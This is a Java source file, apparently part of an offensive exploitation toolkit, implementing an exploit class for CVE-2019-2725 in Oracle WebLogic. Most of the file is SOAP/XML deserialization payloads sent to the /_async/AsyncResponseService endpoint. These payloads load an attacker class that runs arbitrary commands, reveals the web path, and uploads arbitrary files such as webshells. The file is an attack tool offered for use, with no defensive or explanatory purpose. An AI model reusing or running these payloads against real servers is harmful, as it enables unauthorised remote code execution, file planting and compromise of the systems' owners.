public class CVE_2019_2725_12_2 implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private static final String VULURL = "/_async/AsyncResponseService";
    private static String Check_VUL = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n                  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n    <soapenv:Header>\n        <wsa:Action>fff</wsa:Action>\n        <wsa:RelatesTo>hello</wsa:RelatesTo>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><string><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java>\n                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\"><string></string>\n                </void>\n                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n                    <void method=\"defineClass\">\n                        <string>com.supeream.exploits.XmlAPITest</string>\n                        <object idref=\"cls\"></object>\n                        <void method=\"newInstance\">\n                            <void method=\"up\">\n                                <string>p:%s:%s</string>\n                            </void>\n                        </void>\n                    </void>\n                </void>\n            </java>]]></string></void></class></string>\n</java></work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body>\n        <asy:onAsyncDelivery/>\n    </soapenv:Body>\n</soapenv:Envelope>";
    private static String VUL_CMD = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n                  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n    <soapenv:Header>\n        <wsa:Action>fff</wsa:Action>\n        <wsa:RelatesTo>hello</wsa:RelatesTo>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><string><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java>\n                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\"><string></string>\n                </void>\n                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n                    <void method=\"defineClass\">\n                        <string>com.supeream.exploits.XmlAPITest</string>\n                        <object idref=\"cls\"></object>\n                        <void method=\"newInstance\">\n                            <void method=\"say\">\n                                <string>%s</string>\n                            </void>\n                        </void>\n                    </void>\n                </void>\n            </java>]]></string></void></class></string>\n</java></work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body>\n        <asy:onAsyncDelivery/>\n    </soapenv:Body>\n</soapenv:Envelope>";
    private static String UploadFile_VUL_UserPath = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n                  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n    <soapenv:Header>\n        <wsa:Action>fff</wsa:Action>\n        <wsa:RelatesTo>hello</wsa:RelatesTo>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><string><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java>\n                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\"><string></string>\n                </void>\n                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n                    <void method=\"defineClass\">\n                        <string>com.supeream.exploits.XmlAPITest</string>\n                        <object idref=\"cls\"></object>\n                        <void method=\"newInstance\">\n                            <void method=\"up\">\n                                <string>%s</string>\n                            </void>\n                        </void>\n                    </void>\n                </void>\n            </java>]]></string></void></class></string>\n</java></work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body>\n        <asy:onAsyncDelivery/>\n    </soapenv:Body>\n</soapenv:Envelope>";
    private static String Path_VUL = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n                  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n    <soapenv:Header>\n        <wsa:Action>fff</wsa:Action>\n        <wsa:RelatesTo>hello</wsa:RelatesTo>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><string><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java>\n                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\"><string></string>\n                </void>\n                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n                    <void method=\"defineClass\">\n                        <string>com.supeream.exploits.XmlAPITest</string>\n                        <object idref=\"cls\"></object>\n                        <void method=\"newInstance\">\n                            <void method=\"say\">\n                                <string>path</string>\n                            </void>\n                        </void>\n                    </void>\n                </void>\n            </java>]]></string></void></class></string>\n</java></work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body>\n        <asy:onAsyncDelivery/>\n    </soapenv:Body>\n</soapenv:Envelope>";



    public CVE_2019_2725_12_2() { }

    public CVE_2019_2725_12_2(String target) {
        this.target = target;
    }

    @Override
    public String checkVul(String url) {
        this.target = url;
        this.headers.put("Content-type", "text/xml");
        String payload = String.format(Check_VUL, Tools.Base64Encode("favicon.ico"),Tools.Base64Encode("xml_test_ok"));
        HttpTools.post(url + VULURL, payload, this.headers, "UTF-8");

        Response response = HttpTools.get(url + "/_async/" + "favicon.ico", this.headers, "UTF-8");

        if (response.getText() != null && response.getText().equals("xml_test_ok")) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        this.headers.put("Content-type", "text/xml");
        String payload = String.format(VUL_CMD, Tools.Base64Encode(cmd));
        HttpTools.post(this.target + VULURL, payload, this.headers, encoding);

        Response response = HttpTools.get(this.target + "/_async/" + "favicon.ico", this.headers, "UTF-8");

        return response.getText();

    }

    @Override
    public String getWebPath() {
        this.headers.put("Content-type", "text/xml");
        HttpTools.post(this.target + VULURL, Path_VUL, this.headers, "UTF-8");
        Response response = HttpTools.get(this.target + "/_async/" + "favicon.ico", this.headers, "UTF-8");

        return Tools.regReplace(response.getText());
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        this.headers.put("Content-type", "text/xml");
        String result = "";
        String op = "path";
        String respath = filename;
        if (!filename.contains("/")) {
            op = "file";
            respath = this.target + "/_async/" + filename;
        }

        String payload = String.format(UploadFile_VUL_UserPath, op + ":" + Tools.Base64Encode(filename) + ":" + Tools.Base64Encode(fileContent));
        HttpTools.post(this.target + VULURL, payload, this.headers, "UTF-8");

        Response response = HttpTools.get(respath, this.headers, "UTF-8");
        if(response.getCode() == 200) {
            result = result + "  上传成功! " + respath;
        } else {
            result =  "上传失败";
        }
        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
